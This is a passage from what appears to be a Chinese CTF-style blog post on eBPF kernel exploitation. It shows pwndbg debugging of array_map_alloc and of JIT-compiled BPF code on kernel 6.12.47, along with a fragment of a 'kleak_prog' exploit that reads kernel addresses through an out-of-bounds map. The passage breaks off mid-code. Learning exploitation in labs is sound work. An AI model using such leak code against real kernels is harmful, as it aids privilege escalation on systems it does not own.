</ul>
</li>
</ul>
</li>
</ul>
<h3 class="heading-element" id="调试"><span>调试</span>
  <a href="#%e8%b0%83%e8%af%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h4 class="heading-element" id="查结构体"><span>查结构体</span>
  <a href="#%e6%9f%a5%e7%bb%93%e6%9e%84%e4%bd%93" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>在分配一个<code>array</code>类型的<code>map</code>的时候（<code>ebpf pwn</code>中我们通常都使用<code>type</code>为<code>array</code>的<code>map</code>），会调用函数<code>array_map_alloc</code>（路径：<code>/kernel/bpf/arraymap.c</code>）分配<code>struct bpf_array</code>这个函数：</p>
<ul>
<li>调用函数<code> bpf_map_area_alloc</code>，分配<code>struct bpf_array</code></li>
<li>返回<code>&amp;array-&gt;map</code>，也就是返回<code>bpf_array</code>的<code>struct bpf_map</code>，<code>array</code>的首地址</li>
</ul>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-asm"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">xffffffff9b5d4d37</span> <span class="err">&lt;</span><span class="no">array_map_alloc</span><span class="err">+</span><span class="mi">151</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x2d</span><span class="p">],</span><span class="no">r8b</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">xffffffff9b5d4d3b</span> <span class="err">&lt;</span><span class="no">array_map_alloc</span><span class="err">+</span><span class="mi">155</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0xffffffff9b595030</span> <span class="p">&lt;</span><span class="no">bpf_map_area_alloc</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">xffffffff9b5d4d40</span> <span class="err">&lt;</span><span class="no">array_map_alloc</span><span class="err">+</span><span class="mi">160</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">movzx</span>  <span class="no">r8d</span><span class="p">,</span><span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x2d</span><span class="p">]</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p><code>fin</code>这个函数后还没有分配<code>struct bpf_map</code>中的<code>ops</code>，会在这个函数的上层函数<code>__do_sys_bpf</code>中设置<code>ops</code>字段</p>
<blockquote>
<p>ops只有一个，不同的bpf_map都指向同一个ops</p>
</blockquote>
<p>调试命令：</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">b array_map_alloc
</span></span><span class="line"><span class="cl">c
</span></span><span class="line"><span class="cl">fin
</span></span><span class="line"><span class="cl">set $array1 = $rax</span></span></code></pre></td></tr></table></div>
</div>
</div><h4 class="heading-element" id="实际执行bpf程序"><span>实际执行bpf程序</span>
  <a href="#%e5%ae%9e%e9%99%85%e6%89%a7%e8%a1%8cbpf%e7%a8%8b%e5%ba%8f" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><blockquote>
<p>这里的内核版本是6.12.47</p>
</blockquote>
<p>断在<code>sk_filter_trim_cap</code>中，</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-asm"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">xffffffffb3da8d37</span> <span class="err">&lt;</span><span class="no">sk_filter_trim_cap</span><span class="err">+</span><span class="mi">151</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rbx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">xffffffffb3da8d3a</span> <span class="err">&lt;</span><span class="no">sk_filter_trim_cap</span><span class="err">+</span><span class="mi">154</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">call</span>   <span class="mh">0xffffffffb3f6a940</span> <span class="p">&lt;</span><span class="no">__x86_indirect_thunk_rax</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">xffffffffb3da8d3f</span> <span class="err">&lt;</span><span class="no">sk_filter_trim_cap</span><span class="err">+</span><span class="mi">159</span><span class="err">&gt;</span><span class="p">:</span> <span class="no">mov</span>    <span class="no">r15d</span><span class="p">,</span><span class="no">eax</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>当程序停在 <code>0xffffffffb3da8d3a</code> 时，这个指令就是<code>call rax</code>。此时 <code>RAX</code> 寄存器里存的就是 eBPF 程序 JIT 编译后的入口地址。</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; p/x $rip
</span></span><span class="line"><span class="cl">$8 = 0xffffffffb3da8d3a
</span></span><span class="line"><span class="cl">pwndbg&gt; i r rax
</span></span><span class="line"><span class="cl">rax            0xffffffffc022566c  -1071491476
</span></span><span class="line"><span class="cl">pwndbg&gt; vmmap 0xffffffffc022566c
</span></span><span class="line"><span class="cl">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
</span></span><span class="line"><span class="cl">               Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
</span></span><span class="line"><span class="cl">  0xffffffffb49a3000 0xffffffffb4e00000 rw-p   45d000  462000 kernel [.bss]
</span></span><span class="line"><span class="cl">► 0xffffffffc0225000 0xffffffffc0425000 r-xp   200000       0 kernel [.driver .bpf] +0x66c
</span></span><span class="line"><span class="cl">pwndbg&gt;</span></span></code></pre></td></tr></table></div>
</div>
</div><p>按<code>s</code>步入之后，就是在执行<code>bpf</code>程序了</p>
<p>我这里的程序能对应上：</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-asm"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">p</span><span class="err">/</span><span class="no">x</span> <span class="no">$rip</span>
</span></span><span class="line"><span class="cl"><span class="nf">$9</span> <span class="err">=</span> <span class="mi">0xffffffffc022566c</span>
</span></span><span class="line"><span class="cl"><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">x</span><span class="err">/</span><span class="mi">30</span><span class="no">i</span> <span class="mi">0xffffffffc022566c</span>
</span></span><span class="line"><span class="cl"><span class="err">=&gt;</span> <span class="err">0</span><span class="nl">xffffffffc022566c:</span>  <span class="nf">endbr64</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc0225670:</span>  <span class="nf">nop</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="no">rax</span><span class="p">*</span><span class="mi">1</span><span class="err">+</span><span class="mi">0x0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc0225675:</span>  <span class="nf">nop</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc0225678:</span>  <span class="nf">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc0225679:</span>  <span class="nf">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc022567c:</span>  <span class="nf">endbr64</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc0225680:</span>  <span class="nf">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x8</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc0225687:</span>  <span class="nf">push</span>   <span class="no">rbx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc0225688:</span>  <span class="nf">push</span>   <span class="no">r13</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc022568a:</span>  <span class="nf">push</span>   <span class="no">r14</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc022568c:</span>  <span class="nf">push</span>   <span class="no">r15</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc022568e:</span>  <span class="nf">xor</span>    <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>		<span class="c1">#BPF_MOV64_IMM(BPF_REG_0, 0),
</span></span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc0225690:</span>  <span class="nf">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0x63626160</span> 	<span class="c1">#BPF_MOV64_IMM(BPF_REG_1, test),
</span></span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc0225695:</span>  <span class="nf">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">],</span><span class="no">eax</span> <span class="c1">#BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),
</span></span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc0225698:</span>  <span class="nf">lfence</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc022569b:</span>  <span class="nf">mov</span>    <span class="no">rbx</span><span class="p">,</span><span class="no">rdi</span>		<span class="c1">#BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
</span></span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc022569e:</span>  <span class="nf">movabs</span> <span class="no">rdi</span><span class="p">,</span><span class="mi">0xffffa2eb81e43000</span> <span class="c1">#BPF_LD_MAP_FD(BPF_REG_1, oob_map),
</span></span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc02256a8:</span>  <span class="nf">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">rbp</span>		<span class="c1">#BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
</span></span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc02256ab:</span>  <span class="nf">add</span>    <span class="no">rsi</span><span class="p">,</span><span class="mi">0xfffffffffffffffc</span>  <span class="c1">#BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
</span></span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc02256af:</span>  <span class="nf">add</span>    <span class="no">rdi</span><span class="p">,</span><span class="mi">0xf8</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc02256b6:</span>  <span class="nf">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsi</span><span class="err">+</span><span class="mi">0x0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc02256b9:</span>  <span class="nf">cmp</span>    <span class="no">rax</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc02256bd:</span>  <span class="nf">jae</span>    <span class="mi">0xffffffffc02256ce</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc02256bf:</span>  <span class="nf">and</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc02256c2:</span>  <span class="nf">imul</span>   <span class="no">rax</span><span class="p">,</span><span class="no">rax</span><span class="p">,</span><span class="mi">0x150</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc02256c9:</span>  <span class="nf">add</span>    <span class="no">rax</span><span class="p">,</span><span class="no">rdi</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc02256cc:</span>  <span class="nf">jmp</span>    <span class="mi">0xffffffffc02256d0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc02256ce:</span>  <span class="nf">xor</span>    <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc02256d0:</span>  <span class="nf">test</span>   <span class="no">rax</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">xffffffffc02256d3:</span>  <span class="nf">jne</span>    <span class="mi">0xffffffffc02256de</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">test</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">test</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x60\x61\x62\x63\x64\x65\x66\x67</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">bpf_insn</span> <span class="n">kleak_prog</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// load map_ptr_or_null in BPF_REG_0
</span></span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="n">test</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_W</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_6</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_LD_MAP_FD</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="n">oob_map</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_2</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_2</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nf">BPF_CALL_FUNC</span><span class="p">(</span><span class="n">BPF_FUNC_map_lookup_elem</span><span class="p">),</span> <span class="c1">// returns map_ptr + 0x110 (offset of .values in array_map)
</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><h4 class="heading-element" id="pwndbg"><span>pwndbg</span>
  <a href="#pwndbg" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p><code>pwndbg</code>有一个命令<code>kbpf</code>，但是题目编译的内核一般用不了这个命令，少了点东西。。。</p>
<h3 class="heading-element" id="pwn思路"><span>pwn思路</span>
  <a href="#pwn%e6%80%9d%e8%b7%af" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>当我们用<code>bpf</code>系统调用创建了一个类型为<code>BPF_MAP_TYPE_ARRAY</code>的<code>map</code>的时候，会创建一个结构体：</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
